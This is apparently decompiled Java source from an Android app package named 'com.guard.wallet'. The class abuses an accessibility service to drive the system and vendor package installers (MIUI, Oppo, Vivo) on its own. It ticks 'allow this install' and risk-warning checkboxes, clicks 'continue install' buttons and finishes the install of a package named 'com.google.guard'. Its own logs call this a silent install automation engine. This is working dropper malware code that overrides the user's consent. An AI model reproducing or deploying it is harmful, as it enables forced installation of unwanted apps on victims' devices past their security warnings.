package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;

import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;

public final class PackageInstallerDelegate extends AccessibilityDelegate {

    public final ScheduledExecutorService n;
    public final ConcurrentLinkedQueue o;
    public final ReentrantLock p;

    public PackageInstallerDelegate() {
        super(N(), "com.android.packageinstaller");
        long j2;
        ScheduledExecutorService newSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        this.n = newSingleThreadScheduledExecutor;
        this.o = new ConcurrentLinkedQueue();
        this.p = new ReentrantLock();
        try {
            if (!com.guard.wallet.utils.DeviceUtils.isOppoFamily() && !com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                j2 = 120;
            } else {
                j2 = 180;
            }
            newSingleThreadScheduledExecutor.schedule(new com.guard.wallet.delegate.task.PackageInstallerTask(this, 0), j2, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("PackageInstallerDelegate", e2);
        }
    }

    public static ListenWindow H() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.PackageInstallerActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public static CombineFiltersWithOr M() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("MIUI_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter.getStringConditions().add(stringCondition);
        filters.add(combineFilter);

        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.setStringConditions(new LinkedList());
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition2.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter2.getStringConditions().add(stringCondition2);
        filters2.add(combineFilter2);

        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.getStringConditions().add(FilterHelper.initFilter(combineFilter3, "id", "com.android.packageinstaller:id/confirm_bottom_button_layout"));
        filters3.add(combineFilter3);

        List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.setStringConditions(new LinkedList());
        StringCondition stringCondition3 = new StringCondition();
        stringCondition3.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition3.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter4.getStringConditions().add(stringCondition3);
        filters4.add(combineFilter4);

        List<CombineFilter> filters5 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter5 = new CombineFilter();
        combineFilter5.getStringConditions().add(FilterHelper.initFilter(combineFilter5, "id", "com.oplus.appdetail:id/view_bottom_guide_continue_install_btn"));
        filters5.add(combineFilter5);

        List<CombineFilter> filters6 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter6 = new CombineFilter();
        combineFilter6.setStringConditions(new LinkedList());
        StringCondition stringCondition4 = new StringCondition();
        stringCondition4.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition4.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_AUTHORIZE_INSTALL_BTN_TEXT"));
        combineFilter6.getStringConditions().add(stringCondition4);
        filters6.add(combineFilter6);

        List<CombineFilter> filters7 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter7 = new CombineFilter();
        combineFilter7.getStringConditions().add(FilterHelper.addConditionWithEquals(combineFilter7, FilterHelper.initFilter(combineFilter7, "className", "android.widget.LinearLayout"), "id", "android:id/button1"));
        filters7.add(combineFilter7);

        List<CombineFilter> filters8 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter8 = new CombineFilter();
        combineFilter8.getStringConditions().add(FilterHelper.initFilter(combineFilter8, TextBundle.TEXT_ENTRY, "立即安装"));
        filters8.add(combineFilter8);

        List<CombineFilter> filters9 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter9 = new CombineFilter();
        combineFilter9.getStringConditions().add(FilterHelper.initFilter(combineFilter9, TextBundle.TEXT_ENTRY, "仍然安装"));
        filters9.add(combineFilter9);

        return combineFiltersWithOr;
    }

    public static LinkedList N() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(H());
        linkedList.add(Q());
        linkedList.add(P());
        linkedList.add(V());
        linkedList.add(S());
        linkedList.add(U());
        linkedList.add(T());
        return linkedList;
    }

    public static ListenWindow P() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.install.AdbInstallActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow Q() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static boolean R() {
        return com.guard.wallet.utils.DeviceUtils.isOppoFamily() || com.guard.wallet.utils.DeviceUtils.isVivoFamily() || com.guard.wallet.utils.DeviceUtils.isXiaomiFamily();
    }

    public static ListenWindow S() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.guide.ui.InstallGuideActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public static ListenWindow T() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.finish.InstallFinishActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public static ListenWindow U() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.InstallAppProgress");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public static ListenWindow V() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.OPlusPackageInstallerActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public final boolean I() {
        if (k() == null) {
            return false;
        }
        Log.d("PackageInstallerDelegate", "开始查找允许安装复选框");
        k().refresh();
        com.guard.wallet.utils.SystemHelper.T0(10);
        UiObject k2 = k();
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());

        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(FilterHelper.initFilter(combineFilter, "id", "com.android.packageinstaller:id/install_risk_tips"));
        filters.add(combineFilter);

        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.getStringConditions().add(FilterHelper.initFilter(combineFilter2, "id", "com.oplus.appdetail:id/safe_guard_checkbox"));
        filters2.add(combineFilter2);

        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.getStringConditions().add(FilterHelper.initFilter(combineFilter3, "id", "com.oplus.appdetail:id/risk_check_box"));
        filters3.add(combineFilter3);

        List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.getStringConditions().add(FilterHelper.initFilter(combineFilter4, "id", "om.android.packageinstaller:id/deleted_file_state_cb"));
        filters4.add(combineFilter4);

        List<CombineFilter> filters5 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter5 = new CombineFilter();
        combineFilter5.setStringConditions(new LinkedList());
        combineFilter5.setBoolConditions(new LinkedList());
        combineFilter5.getBoolConditions().add(new BoolCondition("clickable", true, true));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("className");
        stringCondition.setEquals("android.widget.CheckBox");
        combineFilter5.getStringConditions().add(stringCondition);
        filters5.add(combineFilter5);

        List<CombineFilter> filters6 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter6 = new CombineFilter();
        combineFilter6.setStringConditions(new LinkedList());
        combineFilter6.setBoolConditions(new LinkedList());
        combineFilter6.getBoolConditions().add(new BoolCondition("checkable", true, true));
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty("className");
        stringCondition2.setEquals("android.widget.Button");
        combineFilter6.getStringConditions().add(stringCondition2);
        filters6.add(combineFilter6);

        UiObject findOneByOperateOr = k2.findOneByOperateOr(combineFiltersWithOr);
        if (findOneByOperateOr != null) {
            Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
            if (!findOneByOperateOr.checkable()) {
                return findOneByOperateOr.click();
            }
            if (!findOneByOperateOr.checked()) {
                Log.d("PackageInstallerDelegate", "允许本次安装查找成功，未勾选");
                if (findOneByOperateOr.clickable()) {
                    findOneByOperateOr.click();
                    com.guard.wallet.utils.SystemHelper.T0(10);
                    findOneByOperateOr.refresh();
                    Log.d("PackageInstallerDelegate", "已点击允许本次安装");
                }
                if (!findOneByOperateOr.checked()) {
                    if (findOneByOperateOr.clickPosition(findOneByOperateOr.centerInScreen().getX(), findOneByOperateOr.centerInScreen().getY())) {
                        Log.d("PackageInstallerDelegate", "已通过中心位置点击允许本次安装");
                        com.guard.wallet.utils.SystemHelper.T0(10);
                        findOneByOperateOr.refresh();
                    }
                    if (!findOneByOperateOr.checked()) {
                        if (findOneByOperateOr.clickPosition(0.05f, 0.5f)) {
                            Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装");
                            com.guard.wallet.utils.SystemHelper.T0(10);
                            findOneByOperateOr.refresh();
                        }
                        if (!findOneByOperateOr.checked()) {
                            if (findOneByOperateOr.parent() != null && findOneByOperateOr.parent().click()) {
                                Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装父节点");
                                com.guard.wallet.utils.SystemHelper.T0(10);
                                findOneByOperateOr.refresh();
                            }
                            if (!findOneByOperateOr.checked()) {
                                return false;
                            }
                        }
                    }
                }
                Log.d("PackageInstallerDelegate", "已勾选允许本次安装");
            }
            return true;
        }
        return false;
    }

    public final boolean J() {
        if (k() == null) {
            return false;
        }
        MyAccessibilityService.I(k());
        UiObject findOneByOperateOr = k().findOneByOperateOr(M());
        AtomicInteger atomicInteger = new AtomicInteger(0);
        while (findOneByOperateOr == null && atomicInteger.incrementAndGet() <= 20) {
            com.guard.wallet.utils.SystemHelper.T0(5);
            findOneByOperateOr = k().findOneByOperateOr(M());
        }
        if (findOneByOperateOr != null) {
            com.guard.wallet.utils.SystemHelper.T0(5);
            if (findOneByOperateOr.clickable() && findOneByOperateOr.click()) {
                Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                return true;
            }
            if (findOneByOperateOr.parent() != null && findOneByOperateOr.parent().clickable() && findOneByOperateOr.parent().click()) {
                Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                return true;
            }
            if (findOneByOperateOr.click()) {
                Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                return true;
            }
        }
        return false;
    }

    public final boolean K() {
        String str;
        if (k() == null) {
            return false;
        }
        UiObject k2 = k();
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());

        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(FilterHelper.initFilter(combineFilter, "id", "com.android.packageinstaller:id/done_button"));
        filters.add(combineFilter);

        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.getStringConditions().add(FilterHelper.initFilter(combineFilter2, "id", "com.oplus.appdetail:id/launch_button"));
        filters2.add(combineFilter2);

        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_INSTALL_FINISH_TEXT"));
        combineFilter3.getStringConditions().add(stringCondition);
        filters3.add(combineFilter3);

        UiObject findOneByOperateOr = k2.findOneByOperateOr(combineFiltersWithOr);
        if (findOneByOperateOr != null && findOneByOperateOr.click()) {
            str = "查找并点击完成安装完成";
        } else {
            UiObject k3 = k();
            CombineFilter combineFilter4 = new CombineFilter();
            combineFilter4.setStringConditions(new LinkedList());
            StringCondition stringCondition2 = new StringCondition();
            stringCondition2.setProperty(TextBundle.TEXT_ENTRY);
            stringCondition2.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_INSTALL_DONE_TEXT"));
            combineFilter4.getStringConditions().add(stringCondition2);
            if (k3.findOneByCombine(combineFilter4) == null) {
                return false;
            }
            str = "安装完成查找成功";
        }
        Log.d("PackageInstallerDelegate", str);
        return true;
    }

    public final void L() {
        ReentrantLock lock = this.p;
        if (!lock.tryLock()) {
            return;
        }
        try {
            AtomicInteger counter = new AtomicInteger(0);
            String pkg = "com.google.guard";
            boolean found = com.guard.wallet.utils.SystemHelper.d0(pkg) != null;
            while (!found && counter.incrementAndGet() <= 20) {
                com.guard.wallet.utils.SystemHelper.T0(2);
                found = com.guard.wallet.utils.SystemHelper.d0(pkg) != null;
            }
            if (found) {
                this.W();
            }
        } finally {
            lock.unlock();
        }
    }

    public final boolean O() {
        if (k() == null) {
            return false;
        }
        MyAccessibilityService.I(k());
        UiObject k2 = k();
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setPrefix(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_INSTALLING_TEXT"));
        combineFilter.getStringConditions().add(stringCondition);
        filters.add(combineFilter);
        if (k2.findOneByOperateOr(combineFiltersWithOr) == null) {
            return false;
        }
        Log.d("PackageInstallerDelegate", "正在安装节点查找成功");
        return true;
    }

    public final void W() {
        Log.d("PackageInstallerDelegate", "准备结束静默安装自动化引擎");
        if (MyAccessibilityService.P() != null) {
            MyAccessibilityService.P().A();
            MyAccessibilityService.P().u();
        }
        this.n.shutdownNow();
        com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
        this.o.clear();
        if (com.guard.wallet.utils.SystemHelper.F0(2)) {
            com.guard.wallet.utils.SystemHelper.T0(5);
        }
        com.guard.wallet.helper.BlockViewManager.c();
        super.d();
        Log.d("PackageInstallerDelegate", "已结束静默安装自动化引擎");
    }

    @Override
    public final void d() {
        try {
            this.n.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
            this.o.clear();
            super.d();
        } catch (Exception e2) {
            AppUtils.s("PackageInstallerDelegate", e2);
        }
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof PackageInstallerDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(PackageInstallerDelegate.class.getName());
    }

    @Override
    public final void u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        super.u(accessibilityEvent, str, str2);
        boolean z6 = false;
        if (q(Collections.singletonList(H()))) {
            Log.d("PackageInstallerDelegate", "已进入通用安装引导窗口");
            z2 = true;
        } else {
            z2 = false;
        }
        String str3 = this.c;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.o;
        if (z2) {
            concurrentLinkedQueue.remove("miuiDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("commonDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("commonInstallMatch")) {
                concurrentLinkedQueue.add("commonInstallMatch");
                com.guard.wallet.thread.DelegateTaskLauncher.c(com.guard.wallet.utils.DeviceUtils.isVivoFamily() ? new com.guard.wallet.delegate.task.PackageInstallerTask(this, 1) : new com.guard.wallet.delegate.task.PackageInstallerTask(this, 2), str3);
            }
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(Q());
        linkedList.add(P());
        if (q(linkedList)) {
            Log.d("PackageInstallerDelegate", "已进入MIUI安装引导对话框");
            z3 = true;
        } else {
            z3 = false;
        }
        if (z3) {
            concurrentLinkedQueue.remove("commonInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("commonDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("miuiDialogInstallMatch")) {
                concurrentLinkedQueue.add("miuiDialogInstallMatch");
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PackageInstallerTask(this, 3), str3);
            }
        }
        ListenWindow listenWindow = new ListenWindow(null, "android.app.AlertDialog");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(listenWindow), listenWindow).add(16384);
        if (q(Collections.singletonList(listenWindow))) {
            Log.d("PackageInstallerDelegate", "已进入通用安装引导对话框");
            z4 = true;
        } else {
            z4 = false;
        }
        if (z4) {
            concurrentLinkedQueue.remove("commonInstallMatch");
            concurrentLinkedQueue.remove("miuiDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("commonDialogInstallMatch")) {
                concurrentLinkedQueue.add("commonDialogInstallMatch");
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PackageInstallerTask(this, 4), str3);
            }
        }
        LinkedList linkedList2 = new LinkedList();
        linkedList2.add(V());
        linkedList2.add(S());
        if (q(linkedList2)) {
            Log.d("PackageInstallerDelegate", "已进入OPPO安装引导窗口");
            z5 = true;
        } else {
            z5 = false;
        }
        if (z5) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PackageInstallerTask(this, 5), str3);
        }
        LinkedList linkedList3 = new LinkedList();
        linkedList3.add(U());
        linkedList3.add(T());
        if (q(linkedList3)) {
            Log.d("PackageInstallerDelegate", "已进入OPPO安装完成窗口");
            z6 = true;
        }
        if (z6) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PackageInstallerTask(this, 6), str3);
        }
    }
}
